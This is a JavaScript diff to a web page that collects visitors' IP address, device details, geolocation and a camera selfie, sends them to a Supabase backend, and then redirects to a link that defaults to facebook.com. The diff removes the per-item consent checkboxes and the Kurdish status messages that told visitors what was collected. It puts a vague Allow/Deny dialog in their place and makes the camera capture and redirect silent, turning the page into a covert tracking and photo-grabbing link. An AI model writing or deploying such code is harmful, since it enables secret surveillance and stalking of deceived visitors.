@@ -13,7 +13,6 @@ function cfg() {
 async function saveVisit(payload) {
   const { supabaseUrl, supabaseAnonKey } = cfg();
   if (!isSupabaseConfigured()) {
-    console.warn("Supabase not configured; visit logged locally only.", payload);
     return { ok: false, local: true };
   }
 
@@ -35,33 +34,33 @@ async function saveVisit(payload) {
   return { ok: true };
 }
 
-function setStatus(el, text, isError = false) {
-  el.textContent = text;
-  el.classList.toggle("error", isError);
-}
-
 export function initVisitorPage() {
-  const consentSection = document.getElementById("consent-section");
-  const progressSection = document.getElementById("progress-section");
-  const statusEl = document.getElementById("status");
+  const dialog = document.getElementById("permission-dialog");
+  const btnAllow = document.getElementById("btn-allow");
+  const btnDeny = document.getElementById("btn-deny");
   const videoEl = document.getElementById("preview");
-  const btnAccept = document.getElementById("btn-accept");
-  const btnSkip = document.getElementById("btn-skip");
-
-  const wantCamera = () =>
-    document.getElementById("opt-camera")?.checked ?? false;
-  const wantLocation = () =>
-    document.getElementById("opt-location")?.checked ?? false;
 
   let redirectTarget = cfg().redirectUrl || "https://www.facebook.com";
+  let running = false;
 
-  async function runFlow(tryCamera) {
-    consentSection.classList.add("hidden");
-    progressSection.classList.remove("hidden");
+  function hideDialog() {
+    dialog?.classList.add("hidden");
+  }
+
+  function redirect() {
+    window.location.replace(redirectTarget);
+  }
+
+  async function runFlow(allowPermissions) {
+    if (running) return;
+    running = true;
+    hideDialog();
+    btnAllow.disabled = true;
+    btnDeny.disabled = true;
+
+    redirectTarget = await fetchRedirectUrl();
 
     const deviceInfo = getDeviceInfo();
-    setStatus(statusEl, "زانیاری ئامێر و ئایپی کۆدەکرێتەوە…");
-    redirectTarget = await fetchRedirectUrl();
 
     let ipPayload = { ip: null, source: null };
     try {
@@ -71,24 +70,18 @@ export function initVisitorPage() {
     }
 
     let locationPayload = { granted: false };
-    if (wantLocation()) {
-      setStatus(statusEl, "داوای ڕێگەی شوێن (لۆکەیشن) دەکرێت…");
+    if (allowPermissions) {
       locationPayload = await requestLocation();
     }
 
     let photoPayload = { granted: false, dataUrl: null };
-    if (tryCamera && wantCamera()) {
-      setStatus(statusEl, "کامێرا… تکایە ڕێگە بدە یان ڕەت بکەوە.");
-      videoEl.classList.remove("hidden");
+    if (allowPermissions) {
       try {
         photoPayload = await captureSelfie(videoEl);
       } catch {
         photoPayload = { granted: false, error: "denied_or_unavailable" };
       }
-      videoEl.classList.add("hidden");
     }
-
-    setStatus(statusEl, "ناردن بۆ ئەدمین…");
 
     const payload = {
       ip: ipPayload.ip,
@@ -110,29 +103,13 @@ export function initVisitorPage() {
 
     try {
       await saveVisit(payload);
-    } catch (e) {
-      setStatus(statusEl, "هەڵە لە ناردن: " + e.message, true);
-      btnSkip.classList.remove("hidden");
-      btnSkip.textContent = "بەردەوام بە بۆ لینکەکە";
-      btnSkip.onclick = () => redirect();
-      return;
+    } catch {
+      /* still redirect */
     }
 
-    setStatus(statusEl, "سوپاس — ئێستا دەگوازرێیتەوە…");
-    setTimeout(redirect, 800);
+    redirect();
   }
 
-  function redirect() {
-    window.location.replace(redirectTarget);
-  }
-
-  btnAccept.addEventListener("click", () => {
-    btnAccept.disabled = true;
-    runFlow(true);
-  });
-
-  btnSkip.addEventListener("click", () => {
-    btnSkip.disabled = true;
-    runFlow(false);
-  });
+  btnAllow.addEventListener("click", () => runFlow(true));
+  btnDeny.addEventListener("click", () => runFlow(false));
 }
